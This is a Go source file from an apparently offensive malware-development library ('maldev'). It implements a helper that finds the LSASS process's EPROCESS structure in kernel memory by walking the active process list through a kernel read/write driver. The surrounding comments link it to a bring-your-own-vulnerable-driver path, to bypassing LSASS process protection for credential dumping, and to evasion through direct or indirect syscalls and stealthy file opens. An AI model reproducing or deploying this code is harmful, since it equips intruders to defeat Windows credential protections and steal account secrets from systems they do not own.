//go:build windows

package lsassdump

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"unsafe"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/kernel/driver"
	"github.com/oioio-space/maldev/win/ntapi"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// FindLsassEProcess walks the kernel's PsActiveProcessLinks doubly-
// linked list and returns the EPROCESS VA of the process whose
// UniqueProcessId matches lsassPID. Operators no longer need to
// resolve lsass.exe's EPROCESS upstream — pass the LSASS PID and
// the kernel ReadWriter and let this helper do the lookup.
//
// The flow:
//
//  1. Discover ntoskrnl.exe's base + RVA of PsInitialSystemProcess.
//     Resolution uses NtQuerySystemInformation(SystemModuleInformation,
//     class 11) which returns the kernel module list — admin
//     privileges required (same as the BYOVD path).
//  2. Resolve EPROCESS.UniqueProcessId / ActiveProcessLinks offsets
//     by parsing the on-disk ntoskrnl.exe (DiscoverUniqueProcessIdOffset).
//  3. Read 8 bytes at `ntoskrnl_base + PsInitialSystemProcessRVA`
//     via the kernel ReadWriter — that's the System EPROCESS
//     pointer (PID 4).
//  4. Walk Flink at `eprocess + ActiveProcessLinksOffset` until
//     UniqueProcessId matches lsassPID OR we loop back to the head
//     OR a 1024-process safety cap fires.
//
// Returns ErrLsassEProcessNotFound when the walk completes without
// matching lsassPID — caller should re-check the PID is correct
// (e.g., via process/enum).
//
// `opener` is the optional stealthopen.Opener used when this helper
// reads ntoskrnl.exe from disk to resolve EPROCESS offsets. Pass
// nil for plain os.Open.
//
// `caller` is the optional *wsyscall.Caller used to route the
// NtQuerySystemInformation lookup that resolves ntoskrnl.exe's
// kernel base. Pass nil to call ntdll!NtQuerySystemInformation
// directly via the WinAPI proc table.
func FindLsassEProcess(rw driver.ReadWriter, lsassPID uint32, opener stealthopen.Opener, caller *wsyscall.Caller) (uintptr, error) {
	if rw == nil {
		return 0, driver.ErrNotLoaded
	}
	if lsassPID == 0 {
		return 0, fmt.Errorf("FindLsassEProcess: lsassPID == 0")
	}

	ntoskrnlBase, err := ntoskrnlKernelBase(caller)
	if err != nil {
		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
	}

	initialRVA, err := DiscoverInitialSystemProcessRVA("", opener)
	if err != nil {
		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
	}
	upidOff, err := DiscoverUniqueProcessIdOffset("", opener)
	if err != nil {
		return 0, fmt.Errorf("FindLsassEProcess: %w", err)
	}
	apLinksOff := DiscoverActiveProcessLinksOffset(upidOff)

	// Read PsInitialSystemProcess pointer — the System EPROCESS.
	systemEPVA, err := readPointerKernel(rw, ntoskrnlBase+uintptr(initialRVA))
	if err != nil {
		return 0, fmt.Errorf("FindLsassEProcess: read PsInitialSystemProcess: %w", err)
	}
	if systemEPVA == 0 {
		return 0, fmt.Errorf("FindLsassEProcess: PsInitialSystemProcess pointer is nil")
	}

	return walkProcessChain(rw, systemEPVA, upidOff, apLinksOff, lsassPID)
}

// walkProcessChain follows the PsActiveProcessLinks doubly-linked
// list starting at `head` (the System EPROCESS) and returns the
// EPROCESS VA whose UniqueProcessId field equals `wantPID`.
//
// Each ActiveProcessLinks is a LIST_ENTRY embedded inside the
// EPROCESS at apLinksOff — to reach the next EPROCESS we read
// Flink (8 bytes at `eprocess+apLinksOff`) and subtract apLinksOff
// to recover the containing struct's base.
//
// Returns ErrLsassEProcessNotFound when the walk completes without
// matching wantPID. Bounded at 4096 iterations as a safety against
// corrupted kernel memory.
//
// Extracted from FindLsassEProcess so tests can pass a synthetic
// driver.ReadWriter without going through ntoskrnlKernelBase /
// ntapi (which require a live Windows kernel).
func walkProcessChain(rw driver.ReadWriter, head uintptr, upidOff, apLinksOff uint32, wantPID uint32) (uintptr, error) {
	const maxProcs = 4096
	current := head
	for i := 0; i < maxProcs; i++ {
		pid, err := readPIDKernel(rw, current+uintptr(upidOff))
		if err != nil {
			return 0, fmt.Errorf("walkProcessChain: read UniqueProcessId @0x%X: %w",
				current+uintptr(upidOff), err)
		}
		if pid == wantPID {
			return current, nil
		}
		flink, err := readPointerKernel(rw, current+uintptr(apLinksOff))
		if err != nil {
			return 0, fmt.Errorf("walkProcessChain: read Flink @0x%X: %w",
				current+uintptr(apLinksOff), err)
		}
		if flink == 0 {
			break
		}
		next := flink - uintptr(apLinksOff)
		if next == head {
			break // looped back to head
		}
		current = next
	}
	return 0, ErrLsassEProcessNotFound
}

// ErrLsassEProcessNotFound fires when the kernel-list walk
// completes without finding a process whose UniqueProcessId
// matches the supplied PID. Operators typically re-check the PID
// (it may have changed if lsass restarted between dump and walk).
var ErrLsassEProcessNotFound = errors.New("lsassdump: lsass EPROCESS not found in PsActiveProcessLinks")

// ntoskrnlKernelBase returns the kernel-mode base address of
// ntoskrnl.exe via NtQuerySystemInformation(SystemModuleInformation,
// class 11). The first entry in the returned list is always
// ntoskrnl.exe (or a renamed kernel image like
// `ntkrnlmp.exe` / `ntkrnlpa.exe` — we check by basename).
//
// Requires SeDebugPrivilege or admin in practice, mirroring the
// existing PPL-bypass requirements.
//
// `caller` is the optional *wsyscall.Caller used to route the
// NtQuerySystemInformation call (indirect / direct syscall, etc.).
// Pass nil to call via ntdll!NtQuerySystemInformation through
// win/ntapi.
func ntoskrnlKernelBase(caller *wsyscall.Caller) (uintptr, error) {
	const systemModuleInformation = 11

	// Probe size — NtQuerySystemInformation returns the required
	// length when buffer is too small.
	var probe [4]byte
	var probeRetLen uint32
	needed, _ := queryNtSystemInfo(caller, systemModuleInformation,
		unsafe.Pointer(&probe[0]), uint32(len(probe)), &probeRetLen)
	if needed == 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation(SystemModuleInformation): zero size needed")
	}

	buf := make([]byte, needed)
	var fetchRetLen uint32
	got, err := queryNtSystemInfo(caller, systemModuleInformation,
		unsafe.Pointer(&buf[0]), needed, &fetchRetLen)
	if err != nil {
		return 0, fmt.Errorf("NtQuerySystemInformation(SystemModuleInformation): %w", err)
	}
	if got < 4 {
		return 0, fmt.Errorf("NtQuerySystemInformation: short reply %d bytes", got)
	}

	// SYSTEM_MODULE_INFORMATION: u32 NumberOfModules, then
	// SYSTEM_MODULE entries (each 296 bytes on x64).
	count := binary.LittleEndian.Uint32(buf[0:4])
	if count == 0 {
		return 0, fmt.Errorf("SystemModuleInformation: zero modules")
	}

	// The first module is the kernel image. SYSTEM_MODULE layout:
	//   +0x00 Reserved      [2]PVOID
	//   +0x10 ImageBase     PVOID
	//   +0x18 ImageSize     uint32
	//   +0x1C Flags         uint32
	//   +0x20 Index         uint16
	//   +0x22 Unknown       uint16
	//   +0x24 LoadCount     uint16
	//   +0x26 NameOffset    uint16
	//   +0x28 Name          [256]CHAR
	// Total: 296 bytes.
	const (
		moduleEntrySize = 296
		imageBaseOff    = 0x10
		nameOff         = 0x28
		nameMax         = 256
	)
	if uint32(len(buf)) < 4+moduleEntrySize {
		return 0, fmt.Errorf("SystemModuleInformation: buffer too small for first entry")
	}
	first := buf[4 : 4+moduleEntrySize]
	imageBase := binary.LittleEndian.Uint64(first[imageBaseOff : imageBaseOff+8])
	if imageBase == 0 {
		return 0, fmt.Errorf("SystemModuleInformation: first module ImageBase is nil")
	}
	// Sanity-check the basename — kernel images are named like
	// "ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe". Anything else
	// flags a non-kernel first entry (rare but theoretically possible).
	rawName := first[nameOff : nameOff+nameMax]
	end := 0
	for end < nameMax && rawName[end] != 0 {
		end++
	}
	fullPath := string(rawName[:end])
	base := strings.ToLower(fullPath)
	if i := strings.LastIndexAny(base, `\/`); i >= 0 {
		base = base[i+1:]
	}
	if !strings.HasPrefix(base, "ntoskrnl") && !strings.HasPrefix(base, "ntkrnl") {
		return 0, fmt.Errorf("SystemModuleInformation: first module %q does not look like the kernel image", fullPath)
	}
	return uintptr(imageBase), nil
}

// queryNtSystemInfo routes NtQuerySystemInformation through `caller`
// when non-nil, falling back to win/ntapi (which calls
// ntdll!NtQuerySystemInformation via the WinAPI proc table) when
// caller is nil. The returned uint32 is *retLen — the size that
// the kernel wants/returned, mirroring the standard Nt semantics.
func queryNtSystemInfo(caller *wsyscall.Caller, infoClass int32, buf unsafe.Pointer, bufLen uint32, retLen *uint32) (uint32, error) {
	if caller != nil {
		r, err := caller.Call("NtQuerySystemInformation",
			uintptr(infoClass),
			uintptr(buf),
			uintptr(bufLen),
			uintptr(unsafe.Pointer(retLen)),
		)
		if err != nil {
			return *retLen, fmt.Errorf("NtQuerySystemInformation: %w", err)
		}
		if r != 0 {
			return *retLen, fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%08X", uint32(r))
		}
		return *retLen, nil
	}
	// Fallback path: route through win/ntapi (ntdll proc table).
	// We forward ntapi's returned length into our retLen so callers
	// keep the buffer-size hint on STATUS_INFO_LENGTH_MISMATCH.
	got, err := ntapi.NtQuerySystemInformation(infoClass, buf, bufLen)
	*retLen = got
	return got, err
}

// readPointerKernel reads 8 bytes at the given kernel VA via the
// driver ReadWriter and decodes them as a little-endian pointer.
func readPointerKernel(rw driver.ReadWriter, va uintptr) (uintptr, error) {
	buf := make([]byte, 8)
	if _, err := rw.ReadKernel(va, buf); err != nil {
		return 0, err
	}
	return uintptr(binary.LittleEndian.Uint64(buf)), nil
}

// readPIDKernel reads EPROCESS.UniqueProcessId (a HANDLE; on x64
// the low 32 bits hold the PID).
func readPIDKernel(rw driver.ReadWriter, va uintptr) (uint32, error) {
	buf := make([]byte, 8)
	if _, err := rw.ReadKernel(va, buf); err != nil {
		return 0, err
	}
	return uint32(binary.LittleEndian.Uint64(buf)), nil
}
